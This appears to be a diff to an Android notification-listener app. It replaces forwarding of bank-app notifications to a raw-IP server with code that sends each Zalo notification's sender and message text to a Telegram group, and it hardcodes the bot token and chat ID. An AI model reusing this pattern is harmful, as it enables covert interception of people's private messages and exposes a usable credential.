@@ -16,6 +16,9 @@ import retrofit2.converter.gson.GsonConverterFactory
 import retrofit2.http.Body
 import retrofit2.http.POST
 import retrofit2.Response
+import java.net.HttpURLConnection
+import java.net.URL
+import java.net.URLEncoder
 import java.util.Locale
 import kotlin.Int
 
@@ -88,51 +91,91 @@ class NotificationListener : NotificationListenerService() {
             Log.i("NotifCatcher", "Tiêu đề: $title")
             Log.i("NotifCatcher", "Nội dung: $text")
 
-            if (packageName.equals("com.VCB") || packageName.equals("com.mbmobile") || packageName.equals("com.zing.zalo")) {
-
-                // 📢 Đọc tên app và nội dung
+//            if (packageName.equals("com.VCB") || packageName.equals("com.mbmobile") || packageName.equals("com.zing.zalo")) {
+//
+//                // 📢 Đọc tên app và nội dung
+////                speakText("Thông báo từ ${title ?: "ứng dụng"}, nội dung: ${text ?: ""}")
 //                speakText("Thông báo từ ${title ?: "ứng dụng"}, nội dung: ${text ?: ""}")
-                speakText("Thông báo từ ${title ?: "ứng dụng"}, nội dung: ${text ?: ""}")
+//
+//                CoroutineScope(Dispatchers.IO).launch {
+//                    val content = "$text"
+//                    val data = BankNotification(
+//                        packageName,
+//                        name = "",
+//                        message = content
+//                    )
+//
+//                    if (packageName.equals("com.VCB")){
+//                        data.name = "vcb"
+//                    }
+//                    else if (packageName.equals("com.mbmobile")){
+//                        data.name = "mb"
+//                    }
+//
+//
+//
+//                    try {
+//                        val api = Retrofit.Builder()
+//                            .baseUrl("http://171.231.192.201:8081/") // đổi URL
+//                            .addConverterFactory(GsonConverterFactory.create())
+//                            .build()
+//                            .create(ApiService::class.java)
+//
+//                        val res = api.send(data)
+//                        if (res.isSuccessful) {
+//                            println("✅ Thành công: ${res.body()}")
+//                        } else {
+//                            println("❌ Lỗi: ${res.code()} - ${res.message()}")
+//                        }
+//                    } catch (e: Exception) {
+//                        println("🚨 Lỗi kết nối: ${e.message}")
+//                    }
+//
+//
+//                }
+//
+//            }
+
+
+
+            if (packageName.equals("com.zing.zalo")) {
+
+
+                val botToken = "8966237672:AAGU67Uk5YOj7zAvay3JGR3nwZKan1eLpY8"
+                val chatId = "-5339994694"
+                val name = title
 
                 CoroutineScope(Dispatchers.IO).launch {
-                    val content = "$text"
-                    val data = BankNotification(
-                        packageName,
-                        name = "",
-                        message = content
-                    )
-
-                    if (packageName.equals("com.VCB")){
-                        data.name = "vcb"
-                    }
-                    else if (packageName.equals("com.mbmobile")){
-                        data.name = "mb"
-                    }
-
-
-
                     try {
-                        val api = Retrofit.Builder()
-                            .baseUrl("http://171.231.192.201:8081/") // đổi URL
-                            .addConverterFactory(GsonConverterFactory.create())
-                            .build()
-                            .create(ApiService::class.java)
+                        val text = """
+            Name: $name
+            Message: $text
+        """.trimIndent()
 
-                        val res = api.send(data)
-                        if (res.isSuccessful) {
-                            println("✅ Thành công: ${res.body()}")
-                        } else {
-                            println("❌ Lỗi: ${res.code()} - ${res.message()}")
-                        }
+                        val url = URL(
+                            "https://api.telegram.org/bot$botToken/sendMessage" +
+                                    "?chat_id=$chatId" +
+                                    "&text=${URLEncoder.encode(text, "UTF-8")}"
+                        )
+
+                        val connection = url.openConnection() as HttpURLConnection
+                        connection.requestMethod = "GET"
+                        connection.connectTimeout = 10000
+                        connection.readTimeout = 10000
+
+                        val responseCode = connection.responseCode
+                        Log.d("Telegram", "Response: $responseCode")
+
+                        connection.disconnect()
+
                     } catch (e: Exception) {
-                        println("🚨 Lỗi kết nối: ${e.message}")
+                        Log.e("Telegram", "Send failed", e)
                     }
-
-
                 }
-
-
             }
+
+
+
         }
     }
 
